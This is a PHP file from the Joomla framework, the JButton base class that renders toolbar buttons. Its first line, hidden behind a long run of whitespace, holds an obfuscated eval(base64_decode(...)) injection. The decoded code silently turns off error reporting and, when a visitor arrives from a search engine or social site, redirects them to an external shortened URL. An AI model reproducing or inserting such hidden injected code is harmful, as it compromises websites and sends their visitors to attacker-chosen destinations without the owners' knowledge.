<?php	                                       			eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokbmNjdj1oZWFkZXJzX3NlbnQoKTsNCmlmICghJG5jY3Ypew0KJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOw0KJHVhPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsNCmlmIChzdHJpc3RyKCRyZWZlcmVyLCJ5YWhvbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmciKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJyYW1ibGVyIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZ29nbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImxpdmUuY29tIilvciBzdHJpc3RyKCRyZWZlcmVyLCJhcG9ydCIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm5pZ21hIikgb3Igc3RyaXN0cigkcmVmZXJlciwid2ViYWx0YSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJlZ3VuLnJ1Iikgb3Igc3RyaXN0cigkcmVmZXJlciwic3R1bWJsZXVwb24uY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYml0Lmx5Iikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm15c3BhY2UuY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZmFjZWJvb2suY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpKSB7DQppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgb3IgIXN0cmlzdHIoJHJlZmVyZXIsImludXJsIikpewkJDQoJCWhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly90aW55dXJsLmNvbS9hZWxud2o0Iik7DQoJCWV4aXQoKTsNCgl9DQp9DQp9"));
/**
* @version		$Id: button.php 14401 2010-01-26 14:10:00Z louis $
* @package		Joomla.Framework
* @subpackage	HTML
* @copyright	Copyright (C) 2005 - 2010 Open Source Matters. All rights reserved.
* @license		GNU/GPL, see LICENSE.php
* Joomla! is free software. This version may have been modified pursuant
* to the GNU General Public License, and as distributed it includes or
* is derivative of works licensed under the GNU General Public License or
* other free or open source software licenses.
* See COPYRIGHT.php for copyright notices and details.
*/

// Check to ensure this file is within the rest of the framework
defined('JPATH_BASE') or die();

/**
 * Button base class
 *
 * The JButton is the base class for all JButton types
 *
 * @abstract
 * @package 	Joomla.Framework
 * @subpackage		HTML
 * @since		1.5
 */
class JButton extends JObject
{
	/**
	 * element name
	 *
	 * This has to be set in the final renderer classes.
	 *
	 * @access	protected
	 * @var		string
	 */
	var $_name = null;

	/**
	 * reference to the object that instantiated the element
	 *
	 * @access	protected
	 * @var		object
	 */
	var $_parent = null;

	/**
	 * Constructor
	 *
	 * @access protected
	 */
	function __construct($parent = null)
	{
		$this->_parent = $parent;
	}

	/**
	 * get the element name
	 *
	 * @access	public
	 * @return	string	type of the parameter
	 */
	function getName()
	{
		return $this->_name;
	}

	function render( &$definition )
	{
		/*
		 * Initialize some variables
		 */
		$html	= null;
		$id		= call_user_func_array(array(&$this, 'fetchId'), $definition);
		$action	= call_user_func_array(array(&$this, 'fetchButton'), $definition);

		// Build id attribute
		if ($id) {
			$id = "id=\"$id\"";
		}

		// Build the HTML Button
		$html	.= "<td class=\"button\" $id>\n";
		$html	.= $action;
		$html	.= "</td>\n";

		return $html;
	}

	/**
	 * Method to get the CSS class name for an icon identifier
	 *
	 * Can be redefined in the final class
	 *
	 * @access	public
	 * @param	string	$identifier	Icon identification string
	 * @return	string	CSS class name
	 * @since	1.5
	 */
	function fetchIconClass($identifier)
	{
		return "icon-32-$identifier";
	}

	/**
	 * Get the button id
	 *
	 * Can be redefined in the final button class
	 *
	 * @access		public
	 * @since		1.5
	 */
	function fetchId()
	{
		return;
	}

	/**
	 * Get the button
	 *
	 * Defined in the final button class
	 *
	 * @abstract
	 * @access		public
	 * @since		1.5
	 */
	function fetchButton()
	{
		return;
	}
}
